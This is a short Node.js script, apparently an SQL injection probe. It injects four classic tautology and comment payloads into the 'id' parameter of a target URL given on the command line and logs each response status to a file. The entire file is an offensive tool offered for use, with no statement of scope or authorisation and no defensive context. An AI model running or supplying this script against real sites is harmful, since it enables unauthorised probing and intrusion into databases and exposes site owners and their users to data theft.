#!/usr/bin/env node
const https = require('https');
const fs = require('fs');
const url = require('url');

const target = process.argv[2];
const log = fs.createWriteStream('logs/sql-injection-log.txt');
const payloads = ["' OR '1'='1", "'--", "' OR 'x'='x", "' OR 1=1--"];

payloads.forEach(payload => {
  const u = new URL(target);
  u.searchParams.set('id', payload);
  https.get(u.href, res => {
    const result = `[${res.statusCode}] Tested: ${u.href}\n`;
    console.log(result); log.write(result);
  }).on('error', () => {
    const err = `[ERR] ${u.href}\n`;
    console.log(err); log.write(err);
  });
});
